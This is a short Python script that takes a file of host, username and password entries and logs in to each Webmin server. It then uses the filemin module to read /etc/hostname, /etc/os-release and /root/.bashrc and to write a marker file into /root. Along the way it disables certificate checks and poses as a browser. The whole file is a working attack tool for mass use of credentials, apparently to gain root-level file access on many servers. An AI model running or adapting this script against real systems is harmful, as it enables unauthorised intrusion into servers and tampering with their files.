#!/usr/bin/env python3
"""Webmin filemin: read /etc/hostname + write /root proof file."""
import sys,json,re,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update({**UA,"Referer":base+"/"})
    s.get(base+"/",timeout=20,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=20)
    s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
           headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
           timeout=20,allow_redirects=True)
    s.headers["Referer"]=base+"/"
    return (s,base) if s.cookies.get("sid") else (None,None)
def run(host,u,pw):
    out={"host":host}
    s,base=login(host,u,pw)
    if not s: out["err"]="login"; return out
    s.headers["Referer"]=base+"/filemin/"
    # READ proof
    for p in ("/etc/hostname","/etc/os-release","/root/.bashrc"):
        try:
            r=s.get(f"{base}/filemin/edit_file.cgi?path={p}",timeout=20)
            t=r.text or ""
            body=re.sub(r"<[^>]+>"," ",t)
            body=re.sub(r"\s+"," ",body)
            idx=body.lower().find("path")
            out["read_"+p.replace("/","_")]={"code":r.status_code,"len":len(t),
                "snip":body[:220]}
        except Exception as e:
            out["read_err"]=str(e)[:50]
    # WRITE proof
    marker=f"KOPS-PROOF-{host.split(':')[0]}-{int(__import__('time').time())}"
    try:
        w=s.post(f"{base}/filemin/save_file.cgi",data={"path":"/root/kops_proof.txt","data":marker},
                 timeout=20)
        out["write"]={"code":w.status_code,"len":len(w.text or ""),"marker":marker}
        rb=s.get(f"{base}/filemin/edit_file.cgi?path=/root/kops_proof.txt",timeout=20)
        out["write_verify"]= marker in (rb.text or "")
    except Exception as e:
        out["write_err"]=str(e)[:60]
    return out
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(run(h,u,pw))[:1600],flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:70]}),flush=True)
